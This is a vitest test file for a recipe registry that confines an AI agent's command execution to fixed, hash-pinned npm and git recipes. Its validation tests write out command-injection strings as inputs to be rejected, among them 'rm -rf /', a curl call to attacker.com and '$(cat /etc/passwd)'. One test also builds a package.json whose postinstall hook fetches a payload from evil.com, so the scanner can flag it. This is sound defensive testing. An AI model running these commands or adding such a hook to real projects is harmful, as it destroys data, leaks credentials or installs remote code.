import { describe, it, expect, beforeEach } from 'vitest';
import * as path from 'node:path';
import * as fs from 'node:fs';
import * as os from 'node:os';
import {
  ErrorCode,
  type RecipeId,
  type RecipeExecutionRequest,
  type RecipeDefinition,
  S00ExecutionDecisionValues,
} from '@mediator/shared-contracts';
import {
  RecipeRegistryService,
  computeRecipeDefinitionHash,
  verifyRecipeDefinitionIntegrity,
  getAllFixedRecipeDefinitions,
  buildFixedRecipeDefinition,
} from './index.js';

describe('Sprint S23 — Fixed Recipe Registry & Dependency Flow', () => {
  let tempWorkspace: string;
  let service: RecipeRegistryService;

  beforeEach(() => {
    tempWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'mediator-s23-test-'));
    service = new RecipeRegistryService();
  });

  // 1. All required recipe IDs are registered
  it('1. registers all required canonical recipe IDs', () => {
    const requiredIds: RecipeId[] = [
      'project.test',
      'project.lint',
      'project.typecheck',
      'project.build',
      'project.single_test',
      'git.status',
      'git.diff',
    ];
    const registered = service.listRecipes().map((r) => r.recipeId);
    for (const id of requiredIds) {
      expect(registered).toContain(id);
      expect(service.getRecipe(id)).toBeDefined();
    }
  });

  // 2. Recipe definitions are canonical and deterministically hashed
  it('2. produces deterministic canonical SHA-256 hashes for recipe definitions', () => {
    const def1 = buildFixedRecipeDefinition('project.test');
    const def2 = buildFixedRecipeDefinition('project.test');
    expect(def1.definitionHash).toHaveLength(64);
    expect(def1.definitionHash).toBe(def2.definitionHash);
    expect(verifyRecipeDefinitionIntegrity(def1)).toBe(true);
  });

  // 3. Altered recipe content causes a hash mismatch
  it('3. detects tampering when recipe content is altered', () => {
    const def = buildFixedRecipeDefinition('project.test');
    const tampered: RecipeDefinition = {
      ...def,
      timeoutMs: 999999, // tampered field
    };
    expect(verifyRecipeDefinitionIntegrity(tampered)).toBe(false);
  });

  // 4. Unknown recipe IDs are rejected
  it('4. rejects unknown recipe IDs with RECIPE_UNKNOWN', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'arbitrary.malicious_script' as unknown as RecipeId,
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect(res.errorCode).toBe(ErrorCode.RECIPE_UNKNOWN);
    expect(res.canExecuteAutomatically).toBe(false);
  });

  // 5. Unknown argument fields / too many args are rejected
  it('5. rejects excess arguments for fixed recipes', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
      args: ['--extra-flag'],
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect(res.errorCode).toBe(ErrorCode.RECIPE_ARGUMENTS_INVALID);
  });

  // 6. Raw executable-path injection is rejected
  it('6. uses fixed trusted executable and rejects arbitrary shell commands', () => {
    const recipe = service.getRecipe('project.test')!;
    expect(recipe.executable).toBe('npm');
    expect(recipe.defaultArgs).toEqual(['test']);
  });

  // 7. Shell operators and command-injection strings are rejected
  it('7. strictly rejects shell operators in arguments', () => {
    const maliciousArgs = [
      'test.test.ts; rm -rf /',
      'test.test.ts && curl http://attacker.com',
      'test.test.ts | sh',
      'test.test.ts `whoami`',
      'test.test.ts $(cat /etc/passwd)',
      'test.test.ts > out.txt',
      'test.test.ts\necho hacked',
    ];

    for (const malArg of maliciousArgs) {
      const req: RecipeExecutionRequest = {
        recipeId: 'project.single_test',
        taskId: 'task-1',
        sessionId: 'session-1',
        correlationId: 'corr-1',
        args: [malArg],
      };
      const res = service.validateRequest(req, {
        workspaceRoot: tempWorkspace,
        activeTaskId: 'task-1',
        activeSessionId: 'session-1',
      });
      expect(res.valid).toBe(false);
      expect(res.errorCode).toBe(ErrorCode.RECIPE_ARGUMENTS_INVALID);
    }
  });

  // 8. Argument type/length limits are enforced
  it('8. rejects arguments exceeding maximum length (256 chars)', () => {
    const longArg = 'a'.repeat(300) + '.test.ts';
    const req: RecipeExecutionRequest = {
      recipeId: 'project.single_test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
      args: [longArg],
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect(res.errorCode).toBe(ErrorCode.RECIPE_ARGUMENTS_INVALID);
  });

  // 9. Path traversal and outside-root requests are rejected
  it('9. rejects path traversal in target argument', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.single_test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
      args: ['../../outside.test.ts'],
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect([ErrorCode.RECIPE_PATH_OUTSIDE_ROOT, ErrorCode.RECIPE_ARGUMENTS_INVALID]).toContain(res.errorCode);
  });

  // 10. Secret/excluded paths are denied
  it('10. denies single_test requests targeting secret or excluded paths', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.single_test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
      args: ['.env.test.ts'],
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect(res.errorCode).toBe(ErrorCode.PATH_EXCLUDED_BY_RULE);
  });

  // 11. Environment overrides cannot change execution authority
  it('11. rejects environment overrides outside allowlist (e.g. PATH, LD_PRELOAD)', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
      envOverrides: {
        PATH: '/tmp/malicious/bin',
      },
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect(res.errorCode).toBe(ErrorCode.RECIPE_ENVIRONMENT_DISALLOWED);
  });

  // 12. AI cannot raise timeout/output limits
  it('12. rejects attempts to raise timeout beyond recipe cap', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
      timeoutMs: 9999999, // default cap is 60000
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect(res.errorCode).toBe(ErrorCode.RECIPE_ARGUMENTS_INVALID);
  });

  // 13. AI cannot choose executable, network, mount or sandbox flags
  it('13. prevents AI from overriding executable identity or flags', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(true);
    expect(res.effectiveArgs).toEqual(['test']);
  });

  // 14. Stale or mismatched scope is rejected
  it('14. rejects request when taskId or sessionId does not match active context', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.test',
      taskId: 'wrong-task',
      sessionId: 'session-1',
      correlationId: 'corr-1',
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect(res.errorCode).toBe(ErrorCode.TASK_SCOPE_MISMATCH);
  });

  // 15. A valid definition remains non-executable under NO-GO-AUTOEXEC
  it('15. marks valid request as canExecuteAutomatically = false under NO-GO-AUTOEXEC', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
      s00Decision: S00ExecutionDecisionValues.NO_GO_AUTOEXEC,
    });
    expect(res.valid).toBe(true);
    expect(res.canExecuteAutomatically).toBe(false);
    expect(res.executionBlockedReason).toContain('NO-GO-AUTOEXEC');
  });

  // 16. Manual suggestions are accurately labelled not-run/not-verified
  it('16. provides clear manual suggestions labeled unverified/not run', () => {
    const suggestion = service.generateManualInstruction('project.test', [], tempWorkspace);
    expect(suggestion.safeToRunManually).toBe(true);
    expect(suggestion.commandText).toBe('npm test');
    expect(suggestion.instructions).toContain('NOT EXECUTED OR VERIFIED BY MEDIATOR');
  });

  // 17. Dependency inspection never runs package scripts
  it('17. statically inspects dependencies without running package manager or scripts', async () => {
    fs.writeFileSync(
      path.join(tempWorkspace, 'package.json'),
      JSON.stringify({
        name: 'test-app',
        scripts: {
          postinstall: 'curl https://evil.com/payload.sh',
        },
        dependencies: {
          lodash: '^4.17.21',
        },
      }),
    );

    const report = await service.inspectDependencies(tempWorkspace);
    expect(report.manifestObserved).toBe(true);
    // Detected risk signal
    expect(report.riskSignals.some((s) => s.includes('Risky lifecycle script'))).toBe(true);
    // Since node_modules does not exist:
    expect(report.state).toBe('dependencies-unavailable');
    expect(report.canRunManualRecipe).toBe(false);
  });

  // 18. Missing dependencies are blocked/not-run without installation
  it('18. blocks manual recipes if node_modules is missing, without attempting install', async () => {
    fs.writeFileSync(
      path.join(tempWorkspace, 'package.json'),
      JSON.stringify({
        name: 'test-app',
        dependencies: { react: '^18.0.0' },
      }),
    );
    const report = await service.inspectDependencies(tempWorkspace);
    expect(report.state).toBe('dependencies-unavailable');
    expect(report.canRunManualRecipe).toBe(false);
    expect(fs.existsSync(path.join(tempWorkspace, 'node_modules'))).toBe(false);
  });

  // 19. Synthetic .env.test contains no copied secrets
  it('19. generates synthetic .env.test free of workspace secrets', () => {
    const syn = service.generateSyntheticEnvTest(tempWorkspace);
    expect(syn.filename).toBe('.env.test');
    expect(syn.isSafe).toBe(true);
    expect(syn.content).toContain('NODE_ENV=test');
    expect(syn.content).not.toContain('API_KEY');
    expect(syn.content).not.toContain('SECRET');
  });

  // 20. Registry initialization is idempotent
  it('20. initialization is idempotent and deterministic', () => {
    const init1 = service.initialize();
    const init2 = service.initialize();
    expect(init1.recipeCount).toBe(init2.recipeCount);
    expect(init1.recipeCount).toBe(9);
  });

  // 21. Persistence restart preserves recipe/status integrity
  it('21. re-instantiated service retains exact pinned hashes', () => {
    const newService = new RecipeRegistryService();
    const origHash = service.getRecipe('project.test')!.definitionHash;
    const newHash = newService.getRecipe('project.test')!.definitionHash;
    expect(newHash).toBe(origHash);
  });

  // 22. Recipe tampering generates a safe integrity error
  it('22. fails request validation when recipe definition hash has been tampered with', () => {
    const req: RecipeExecutionRequest = {
      recipeId: 'project.test',
      definitionHash: '0'.repeat(64), // tampered hash
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
    };
    const res = service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    expect(res.valid).toBe(false);
    expect(res.errorCode).toBe(ErrorCode.RECIPE_TAMPERED);
  });

  // 23. No registry operation writes to the live workspace
  it('23. guarantees that inspection and validation do not write files to workspace', async () => {
    const beforeFiles = fs.readdirSync(tempWorkspace);
    await service.inspectDependencies(tempWorkspace);
    const req: RecipeExecutionRequest = {
      recipeId: 'project.test',
      taskId: 'task-1',
      sessionId: 'session-1',
      correlationId: 'corr-1',
    };
    service.validateRequest(req, {
      workspaceRoot: tempWorkspace,
      activeTaskId: 'task-1',
      activeSessionId: 'session-1',
    });
    const afterFiles = fs.readdirSync(tempWorkspace);
    expect(afterFiles).toEqual(beforeFiles);
  });
});
